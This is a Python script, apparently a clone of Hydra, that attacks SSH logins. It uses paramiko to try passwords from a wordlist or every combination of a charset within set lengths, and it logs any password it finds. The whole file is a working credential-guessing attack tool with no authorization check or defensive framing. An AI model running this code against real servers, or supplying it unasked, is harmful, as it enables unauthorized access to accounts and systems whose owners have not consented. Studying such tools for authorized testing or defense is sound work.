import argparse
import paramiko
import itertools
import string
import logging
import time

# Set up logging to both console and file
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Create a file handler to write logs to a file
file_handler = logging.FileHandler('hydra.log')
file_handler.setLevel(logging.INFO)  # Set the level for the file handler

# Create a console handler to output logs to the console
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)  # Set the level for the console handler

# Define a formatter and set it for both handlers
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)
console_handler.setFormatter(formatter)

# Add handlers to the logger
logger.addHandler(file_handler)
logger.addHandler(console_handler)

def log_new_attack_attempt():
    """
    Logs a header to indicate the start of a new attack attempt.
    Adds a visual separator to the log file for better readability.
    """
    logger.info("="*50)
    logger.info("New Attack Attempt")
    logger.info("="*50 + "\n")

def try_login(username: str, server: str, password: str, port: int = 22) -> bool:
    """
    Attempts to log in to the SSH server using the provided username and password.

    Args:
        username (str): The SSH username.
        server (str): The server address (IP address or DNS name).
        password (str): The password to attempt.
        port (int): The SSH port to connect to (default is 22).

    Returns:
        bool: True if login is successful, False otherwise.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server, username=username, password=password, port=port, timeout=10, allow_agent=False, look_for_keys=False)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        logger.error(f"Error: {e}")
        return False
    finally:
        client.close()

def brute_force_password(username: str, server: str, min_len: int, max_len: int, charset: str, port: int):
    """
    Performs a brute-force attack to find the password by trying all combinations 
    within the given length and charset.

    Args:
        username (str): The SSH username.
        server (str): The server address (IP address or DNS name).
        min_len (int): Minimum password length.
        max_len (int): Maximum password length.
        charset (str): Characters to use in password generation.
        port (int): The SSH port.

    Logs each attempt and the outcome. Reports the time taken to complete the attack.
    """
    def password_generator():
        """
        Generates all possible passwords within the given length and charset.
        """
        for length in range(min_len, max_len + 1):
            for pwd in itertools.product(charset, repeat=length):
                yield ''.join(pwd)
    
    start_time = time.time()
    log_new_attack_attempt()
    logger.info("Brute-force attack started" + "\n")

    for password in password_generator():
        logger.debug(f"Trying password: {password}")
        success = try_login(username, server, password, port)
        if success:
            logger.info(f"Username: {username}, Server: {server}, Password found: {password}")
            break

    elapsed_time = time.time() - start_time
    logger.info(f"Brute-force attack completed in {elapsed_time:.2f} seconds")

def main():
    """
    Parses command-line arguments and initiates the attack based on the provided parameters.

    Handles both dictionary and brute-force attacks based on the presence of a wordlist file.
    """
    parser = argparse.ArgumentParser(description="Hydra-like SSH Brute Force Tool")
    parser.add_argument('-u', required=True, help="Username for SSH login")
    parser.add_argument('-s', required=True, help="Server IP address or DNS")
    parser.add_argument('-p', type=int, default=22, help="Port for SSH connection (default is 22)")
    parser.add_argument('-w', help="Path to the wordlist for dictionary attack")
    parser.add_argument('--min', type=int, default=1, help="Minimum password length for brute force attack")
    parser.add_argument('--max', type=int, default=4, help="Maximum password length for brute force attack")
    parser.add_argument('-c', default=string.ascii_letters + string.digits, help="Charset for brute force attack")

    args = parser.parse_args()

    if args.w:
        # Dictionary attack
        log_new_attack_attempt()
        logger.info("Dictionary attack started" + "\n")
        try:
            with open(args.w, 'r') as wordlist:
                for password in wordlist:
                    password = password.strip()
                    if try_login(args.u, args.s, password, args.p):
                        logger.info(f"Username: {args.u}, Server: {args.s}, Password found: {password}")
                        return
        except FileNotFoundError:
            logger.error("Wordlist file not found")
        logger.info("Password not found")
    else:
        # Brute force attack
        brute_force_password(args.u, args.s, args.min, args.max, args.c, args.p)

if __name__ == "__main__":
    main()
